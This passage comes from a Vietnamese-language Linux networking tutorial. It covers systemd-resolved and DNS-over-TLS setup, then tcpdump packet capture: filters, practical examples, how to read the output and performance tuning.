</span></span><span class=line><span class=cl><span class=c1># DNSStubListener=  Bật stub resolver trên 127.0.0.53</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Apply changes</span>
</span></span><span class=line><span class=cl>systemctl restart systemd-resolved
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Modes của /etc/resolv.conf:</span>
</span></span><span class=line><span class=cl><span class=c1># 1. stub (default): Symlink đến /run/systemd/resolve/stub-resolv.conf</span>
</span></span><span class=line><span class=cl><span class=c1>#    nameserver 127.0.0.53</span>
</span></span><span class=line><span class=cl><span class=c1>#    → Dùng systemd-resolved làm local resolver</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># 2. static: Symlink đến /run/systemd/resolve/resolv.conf</span>
</span></span><span class=line><span class=cl><span class=c1>#    nameserver &lt;upstream DNS từ systemd-resolved&gt;</span>
</span></span><span class=line><span class=cl><span class=c1>#    → Bypass stub, query upstream trực tiếp</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># 3. uplink: Symlink đến /run/NetworkManager/resolv.conf</span>
</span></span><span class=line><span class=cl><span class=c1>#    → NetworkManager quản lý</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Chuyển mode:</span>
</span></span><span class=line><span class=cl>ln -sf /run/systemd/resolve/stub-resolv.conf /etc/resolv.conf  <span class=c1># stub</span>
</span></span><span class=line><span class=cl>ln -sf /run/systemd/resolve/resolv.conf /etc/resolv.conf       <span class=c1># static</span></span></span></code></pre></div><h3 class=heading-element id=116-dns-over-tls-dot-với-systemd-resolved><span>11.6 DNS-over-TLS (DoT) với systemd-resolved</span>
<a href=#116-dns-over-tls-dot-v%e1%bb%9bi-systemd-resolved class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># /etc/systemd/resolved.conf</span>
</span></span><span class=line><span class=cl><span class=o>[</span>Resolve<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=nv>DNS</span><span class=o>=</span>1.1.1.1#cloudflare-dns.com 1.0.0.1#cloudflare-dns.com
</span></span><span class=line><span class=cl><span class=nv>DNSOverTLS</span><span class=o>=</span>yes
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Format: IP#hostname (hostname để verify TLS certificate)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Providers hỗ trợ DoT:</span>
</span></span><span class=line><span class=cl><span class=c1># Cloudflare: 1.1.1.1#cloudflare-dns.com</span>
</span></span><span class=line><span class=cl><span class=c1># Google:     8.8.8.8#dns.google</span>
</span></span><span class=line><span class=cl><span class=c1># Quad9:      9.9.9.9#dns.quad9.net</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Kiểm tra DoT đang hoạt động</span>
</span></span><span class=line><span class=cl>resolvectl status
</span></span><span class=line><span class=cl><span class=c1># Phải thấy: DNSOverTLS=yes và &#34;DNS Servers: 1.1.1.1#cloudflare-dns.com&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Capture để verify (phải thấy TLS traffic, không phải plaintext DNS)</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 port <span class=m>853</span>   <span class=c1># DoT dùng port 853</span></span></span></code></pre></div><hr><h2 class=heading-element id=phần-12-tcpdump---packet-capture><span>PHẦN 12: TCPDUMP - PACKET CAPTURE</span>
<a href=#ph%e1%ba%a7n-12-tcpdump---packet-capture class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><h3 class=heading-element id=121-packet-capture-fundamentals><span>12.1 Packet Capture Fundamentals</span>
<a href=#121-packet-capture-fundamentals class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-markdown data-lang=markdown><span class=line><span class=cl>┌─────────────────────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>│              PACKET CAPTURE ARCHITECTURE                    │
</span></span><span class=line><span class=cl>└─────────────────────────────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌──────────────────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>│                    User Space                            │
</span></span><span class=line><span class=cl>│   ┌──────────┐   ┌──────────┐   ┌──────────┐             │
</span></span><span class=line><span class=cl>│   │ tcpdump  │   │ wireshark│   │ tshark   │             │
</span></span><span class=line><span class=cl>│   └────┬─────┘   └────┬─────┘   └────┬─────┘             │
</span></span><span class=line><span class=cl>│       │              │              │                    │
</span></span><span class=line><span class=cl>│       └──────────────┼──────────────┘                    │
</span></span><span class=line><span class=cl>│                      │                                   │
</span></span><span class=line><span class=cl>│              ┌───────▼───────┐                           │
</span></span><span class=line><span class=cl>│              │    libpcap    │ ← Packet capture library  │
</span></span><span class=line><span class=cl>│              └───────┬───────┘                           │
</span></span><span class=line><span class=cl>└──────────────────────│───────────────────────────────────┘
</span></span><span class=line><span class=cl>                       │
</span></span><span class=line><span class=cl>┌──────────────────────│───────────────────────────────────┐
</span></span><span class=line><span class=cl>│                      │ Kernel Space                      │
</span></span><span class=line><span class=cl>│              ┌───────▼───────┐                           │
</span></span><span class=line><span class=cl>│              │ BPF (Berkeley │ ← Filter packets          │
</span></span><span class=line><span class=cl>│              │ Packet Filter)│   trong kernel            │
</span></span><span class=line><span class=cl>│              └───────┬───────┘                           │
</span></span><span class=line><span class=cl>│                      │                                   │
</span></span><span class=line><span class=cl>│              ┌───────▼───────┐                           │
</span></span><span class=line><span class=cl>│              │   AF_PACKET   │ ← Raw socket              │
</span></span><span class=line><span class=cl>│              └───────┬───────┘                           │
</span></span><span class=line><span class=cl>│                      │                                   │
</span></span><span class=line><span class=cl>│              ┌───────▼───────┐                           │
</span></span><span class=line><span class=cl>│              │   NIC Driver  │                           │
</span></span><span class=line><span class=cl>│              └───────────────┘                           │
</span></span><span class=line><span class=cl>└──────────────────────────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>BPF Filter = Bytecode chạy trong kernel
</span></span><span class=line><span class=cl><span class=k>-</span> Filter packet TRƯỚC khi copy lên userspace
</span></span><span class=line><span class=cl><span class=k>-</span> Giảm overhead đáng kể
</span></span><span class=line><span class=cl><span class=k>-</span> tcpdump compile filter expression → BPF bytecode
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Promiscuous mode:
</span></span><span class=line><span class=cl><span class=k>-</span> Bình thường: NIC chỉ nhận packets cho MAC của nó
</span></span><span class=line><span class=cl><span class=k>-</span> Promiscuous: NIC nhận TẤT CẢ packets trên network segment
</span></span><span class=line><span class=cl>- Cần cho capture traffic không phải của mình</span></span></code></pre></div><h3 class=heading-element id=122-tcpdump-cú-pháp><span>12.2 tcpdump Cú Pháp</span>
<a href=#122-tcpdump-c%c3%ba-ph%c3%a1p class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>tcpdump <span class=o>[</span>options<span class=o>]</span> <span class=o>[</span>expression<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Options hay dùng:</span>
</span></span><span class=line><span class=cl>-i interface    <span class=c1># Interface cụ thể (-i any = tất cả)</span>
</span></span><span class=line><span class=cl>-n              <span class=c1># Không resolve hostname</span>
</span></span><span class=line><span class=cl>-nn             <span class=c1># Không resolve hostname và port names</span>
</span></span><span class=line><span class=cl>-v/-vv/-vvv     <span class=c1># Verbose levels</span>
</span></span><span class=line><span class=cl>-c count        <span class=c1># Capture count packets rồi dừng</span>
</span></span><span class=line><span class=cl>-w file         <span class=c1># Write to file (pcap format)</span>
</span></span><span class=line><span class=cl>-r file         <span class=c1># Read from file</span>
</span></span><span class=line><span class=cl>-s snaplen      <span class=c1># Capture snaplen bytes mỗi packet (0 = full)</span>
</span></span><span class=line><span class=cl>-A              <span class=c1># Print packet payload as ASCII</span>
</span></span><span class=line><span class=cl>-X              <span class=c1># Print payload as hex và ASCII</span>
</span></span><span class=line><span class=cl>-e              <span class=c1># Print link-level (Ethernet) header</span>
</span></span><span class=line><span class=cl>-q              <span class=c1># Quiet (less output)</span>
</span></span><span class=line><span class=cl>-t              <span class=c1># Không in timestamp</span>
</span></span><span class=line><span class=cl>-tttt           <span class=c1># Human-readable timestamp</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Filter expression (BPF syntax)</span></span></span></code></pre></div><h3 class=heading-element id=123-filter-expressions><span>12.3 Filter Expressions</span>
<a href=#123-filter-expressions class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Protocol filters</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 tcp
</span></span><span class=line><span class=cl>tcpdump -i eth0 udp
</span></span><span class=line><span class=cl>tcpdump -i eth0 icmp
</span></span><span class=line><span class=cl>tcpdump -i eth0 arp
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Host filters</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 host 192.168.1.100           <span class=c1># Src OR dst</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 src host 192.168.1.100       <span class=c1># Src only</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 dst host 192.168.1.100       <span class=c1># Dst only</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 host 192.168.1.100 or host 192.168.1.200
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Network filters</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 net 192.168.1.0/24
</span></span><span class=line><span class=cl>tcpdump -i eth0 src net 10.0.0.0/8
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Port filters</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 port <span class=m>80</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 src port <span class=m>443</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 dst port <span class=m>22</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 portrange 1-1024
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Combining filters</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 <span class=s1>&#39;host 192.168.1.100 and port 80&#39;</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 <span class=s1>&#39;host 192.168.1.100 and (port 80 or port 443)&#39;</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 <span class=s1>&#39;tcp and port 80 and host 192.168.1.100&#39;</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 <span class=s1>&#39;not port 22&#39;</span>                 <span class=c1># Exclude SSH</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 <span class=s1>&#39;not arp and not icmp&#39;</span>        <span class=c1># Exclude ARP, ICMP</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># TCP flags</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 <span class=s1>&#39;tcp[tcpflags] &amp; tcp-syn != 0&#39;</span>     <span class=c1># SYN packets</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 <span class=s1>&#39;tcp[tcpflags] &amp; tcp-rst != 0&#39;</span>     <span class=c1># RST packets</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 <span class=s1>&#39;tcp[tcpflags] &amp; tcp-fin != 0&#39;</span>     <span class=c1># FIN packets</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 <span class=s1>&#39;tcp[tcpflags] == tcp-syn&#39;</span>         <span class=c1># SYN only (no ACK)</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 <span class=s1>&#39;tcp[13] = 2&#39;</span>                      <span class=c1># SYN (flag byte = 2)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Packet size</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 <span class=s1>&#39;greater 1000&#39;</span>                <span class=c1># Packets &gt; 1000 bytes</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 <span class=s1>&#39;less 100&#39;</span>                    <span class=c1># Packets &lt; 100 bytes</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># VLAN</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 <span class=s1>&#39;vlan 100&#39;</span>                    <span class=c1># VLAN 100 traffic</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Content matching (advanced)</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 <span class=s1>&#39;tcp[32:4] = 0x47455420&#39;</span>      <span class=c1># &#34;GET &#34; in TCP payload</span></span></span></code></pre></div><h3 class=heading-element id=124-practical-examples><span>12.4 Practical Examples</span>
<a href=#124-practical-examples class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Capture HTTP traffic</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 -nn <span class=s1>&#39;tcp port 80&#39;</span> -A
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Capture HTTPS handshake (không thấy content, chỉ thấy TLS)</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 -nn <span class=s1>&#39;tcp port 443&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Capture DNS queries</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 -nn <span class=s1>&#39;udp port 53&#39;</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 -nn <span class=s1>&#39;port 53&#39;</span> -vv    <span class=c1># Verbose để thấy query details</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Capture SSH traffic (debug connection issues)</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 -nn <span class=s1>&#39;tcp port 22&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Capture DHCP</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 -nn <span class=s1>&#39;udp port 67 or udp port 68&#39;</span> -e
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Capture ARP</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 -nn arp
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Capture ICMP (ping)</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 -nn icmp
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Capture traffic from specific host</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 -nn <span class=s1>&#39;host 192.168.1.100&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Capture SYN flood attack</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 -nn <span class=s1>&#39;tcp[tcpflags] == tcp-syn&#39;</span> -c <span class=m>1000</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Save to file for Wireshark analysis</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 -nn -w capture.pcap <span class=s1>&#39;host 192.168.1.100&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Read from file</span>
</span></span><span class=line><span class=cl>tcpdump -r capture.pcap -nn
</span></span><span class=line><span class=cl>tcpdump -r capture.pcap -nn <span class=s1>&#39;tcp port 80&#39;</span>    <span class=c1># Filter while reading</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Rotate capture files (long-running capture)</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 -nn -w capture.pcap -C <span class=m>100</span> -W <span class=m>10</span>
</span></span><span class=line><span class=cl><span class=c1># -C 100: Rotate khi file đạt 100MB</span>
</span></span><span class=line><span class=cl><span class=c1># -W 10: Giữ tối đa 10 files (capture0.pcap - capture9.pcap)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Capture với timestamps chi tiết</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 -nn -tttt <span class=s1>&#39;port 80&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Capture và show payload</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 -nn -X <span class=s1>&#39;tcp port 80 and host 192.168.1.100&#39;</span></span></span></code></pre></div><h3 class=heading-element id=125-output-analysis><span>12.5 Output Analysis</span>
<a href=#125-output-analysis class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Typical output:</span>
</span></span><span class=line><span class=cl><span class=c1># 14:32:15.123456 IP 192.168.1.100.54321 &gt; 93.184.216.34.80: Flags [S], seq 1234567890, win 65535, options [mss 1460,sackOK,TS val 123456 ecr 0,nop,wscale 7], length 0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Breakdown:</span>
</span></span><span class=line><span class=cl><span class=c1># 14:32:15.123456          Timestamp</span>
</span></span><span class=line><span class=cl><span class=c1># IP                       Protocol (IP, IP6, ARP, etc)</span>
</span></span><span class=line><span class=cl><span class=c1># 192.168.1.100.54321      Source IP.port</span>
</span></span><span class=line><span class=cl><span class=c1># &gt;                        Direction</span>
</span></span><span class=line><span class=cl><span class=c1># 93.184.216.34.80         Destination IP.port</span>
</span></span><span class=line><span class=cl><span class=c1># Flags [S]                TCP flags:</span>
</span></span><span class=line><span class=cl><span class=c1>#                          S = SYN</span>
</span></span><span class=line><span class=cl><span class=c1>#                          . = ACK</span>
</span></span><span class=line><span class=cl><span class=c1>#                          F = FIN</span>
</span></span><span class=line><span class=cl><span class=c1>#                          R = RST</span>
</span></span><span class=line><span class=cl><span class=c1>#                          P = PUSH</span>
</span></span><span class=line><span class=cl><span class=c1>#                          [S.] = SYN+ACK</span>
</span></span><span class=line><span class=cl><span class=c1># seq 1234567890           Sequence number</span>
</span></span><span class=line><span class=cl><span class=c1># win 65535                Window size</span>
</span></span><span class=line><span class=cl><span class=c1># options [...]            TCP options</span>
</span></span><span class=line><span class=cl><span class=c1># length 0                 Payload length</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># TCP flags combinations:</span>
</span></span><span class=line><span class=cl><span class=c1># [S]     SYN (connection initiation)</span>
</span></span><span class=line><span class=cl><span class=c1># [S.]    SYN-ACK (connection acknowledgment)</span>
</span></span><span class=line><span class=cl><span class=c1># [.]     ACK</span>
</span></span><span class=line><span class=cl><span class=c1># [P.]    PSH-ACK (push data)</span>
</span></span><span class=line><span class=cl><span class=c1># [F.]    FIN-ACK (connection termination)</span>
</span></span><span class=line><span class=cl><span class=c1># [R]     RST (reset/abort)</span>
</span></span><span class=line><span class=cl><span class=c1># [R.]    RST-ACK</span></span></span></code></pre></div><h3 class=heading-element id=126-performance-considerations><span>12.6 Performance Considerations</span>
<a href=#126-performance-considerations class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Problem: tcpdump có thể drop packets dưới high load</span>
</span></span><span class=line><span class=cl><span class=c1># Solution:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 1. Increase buffer size</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 -B <span class=m>4096</span> -nn <span class=s1>&#39;port 80&#39;</span>    <span class=c1># 4MB buffer</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 2. Capture less per packet</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 -s <span class=m>96</span> -nn <span class=s1>&#39;port 80&#39;</span>      <span class=c1># Chỉ capture 96 bytes</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 3. Write to file (nhanh hơn print to screen)</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 -w capture.pcap -nn <span class=s1>&#39;port 80&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 4. Filter aggressively trong kernel (BPF)</span>
</span></span><span class=line><span class=cl><span class=c1># Bad:  tcpdump -i eth0 | grep &#34;192.168.1.100&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># Good: tcpdump -i eth0 &#39;host 192.168.1.100&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Check drops</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 -nn <span class=s1>&#39;port 80&#39;</span> 2&gt;<span class=p>&amp;</span><span class=m>1</span> <span class=p>|</span> tail -1
</span></span><span class=line><span class=cl><span class=c1># &#34;X packets captured, Y packets received by filter, Z packets dropped by kernel&#34;</span></span></span></code></pre></div><hr><h2 class=heading-element id=phần-13-modern-firewalls---firewalld--ufw><span>PHẦN 13: MODERN FIREWALLS - FIREWALLD & UFW</span>
<a href=#ph%e1%ba%a7n-13-modern-firewalls---firewalld--ufw class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><h3 class=heading-element id=131-iptables-vs-nftables-vs-firewalldufw><span>13.1 iptables vs nftables vs firewalld/ufw</span>
<a href=#131-iptables-vs-nftables-vs-firewalldufw class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-markdown data-lang=markdown><span class=line><span class=cl>┌─────────────────────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>│              LINUX FIREWALL EVOLUTION                       │
